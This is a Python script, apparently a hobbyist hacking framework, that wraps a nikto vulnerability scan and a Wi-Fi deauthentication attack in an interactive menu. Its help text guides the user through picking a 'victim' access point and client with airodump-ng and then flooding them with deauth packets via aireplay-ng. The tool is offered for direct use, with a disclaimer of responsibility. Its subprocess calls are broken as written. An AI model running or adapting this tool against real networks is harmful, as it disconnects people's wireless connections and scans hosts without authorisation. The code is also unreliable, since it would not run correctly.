import subprocess

def welcome():
    print("    _         _                        _            ")
    print("   / \  _   _| |_ ___  _ __ ___   __ _| |_ ___ _ __ ")
    print("  / _ \| | | | __/ _ \| '_ ` _ \ / _` | __/ _ \ '__|")
    print(" / ___ \ |_| | || (_) | | | | | | (_| | ||  __/ |   version 1")
    print("/_/   \_\__,_|\__\___/|_| |_| |_|\__,_|\__\___|_|   By @Kr0n0s")
    print()

def help():
    welcome()
    print("This is an automated framework for newbie and for lazy people")
    print("I AM NOT RESPONSIBLE FOR THE USE YOU WILL HAVE WITH MY PROJECT!")
    print()
    print("Available commands:")
    print("\thelp ==> Show this help message")
    print("\tScanner:")
    print("\t\tnikto ==> Make a vulnerability scanner")
    print("\tWi-Fi:")
    print("\t\tdeauth ==> MAke a deauth attack")
    print("\texit ==> Exit the framework")

def nikto():
    print("You have chosen the module: nikto")
    while True:
        command = str(input("#nikto>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This module make a scan of the target to find vuln")
            print("\thelp ==> Show this help message")
            print("\ttarget ==> Set the target host")
            print("\texecute ==> Start the scanner")
            print("\tback ==> Go back to the main menu")
        if command.startswith("target") or command.endswith("target"):
            target1 = command.replace("target", "")
            target = target1.replace(" ", "")
            print("target =>", target)
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "nikto -host " + target
            try:
                subprocess.run([shell1])
            except:
                print("There is some error...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: nikto")
            break

def deauth():
    print("You have chosen the module: deauth")
    while True:
        command = str(input("#deauth>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This module make a deauth attack")
            print("Before you use this module you have to run, in another terminal, \"airmon-ng start wlan0\" and then \"airodump-ng wlan0\"")
            print("when you see your victim hit Ctrl-C and enter the command \"airmon-ng stop wlan0mon\". This allows you to get what you need")
            print("\thelp ==> Show this message")
            print("\tinterface ==> Select the interface (not in monitor mode)")
            print("\tbssid ==> Set the bssid of the vicitim (you find it in the column: BSSID)")
            print("\tmac ==> Set the mac of the victim (you can find it in the column: STATION, in the line with the victim's bssid)")
            print("\tnumber ==> Set the number of packets to send")
            print("\tchannel ==> Set the channel of the victim (between 1 and 13) (in the column: CH, in the line with the victim's bssid")
            print("\texecute ==> Start the attack")
            print("\tback ==> Go back to the main menu")
        if command.startswith("interface") or command.endswith("interface"):
            interface1 = command.replace("interface", "")
            interface = interface1.replace(" ", "")
            print("interface =>", interface)
        if command.startswith("bssid") or command.endswith("bssid"):
            bssid1 = command.replace("bssid", "")
            bssid = bssid1.replace(" ", "")
            print("bssid =>", bssid)
        if command.startswith("mac") or command.endswith("mac"):
            mac1 = command.replace("mac", "")
            mac = mac1.replace(" ", "")
            print("mac =>", mac)
        if command.startswith("number") or command.endswith("number"):
            number1 = command.replace("number", "")
            number = number1.replace(" ", "")
            print("number =>", number)
        if command.startswith("channel") or command.endswith("channel"):
            channel1 = command.replace("channel", "")
            channel = channel1.replace(" ", "")
            print("channel =>", channel)
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "airmon-ng start " + interface + " " + channel
            interface2 = interface + "mon"
            shell2 = "aireplay-ng -0 " + number + " -a " + bssid + " -c " + mac + " " + interface2
            try:
                subprocess.run([shell1])
                subprocess.run([shell2])
            except:
                print("There is some error...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: deauth")
            break

welcome()
while True:
    command = str(input("#>>>"))
    if command.startswith("help") or command.endswith("help"):
        help()
    if command.startswith("deauth") or command.endswith("deauth"):
        deauth()
    if command.startswith("nikto") or command.endswith("nikto"):
        nikto()
    if command.startswith("exit") or command.endswith("exit"):
        print("See you at the next hack ;-)")
        break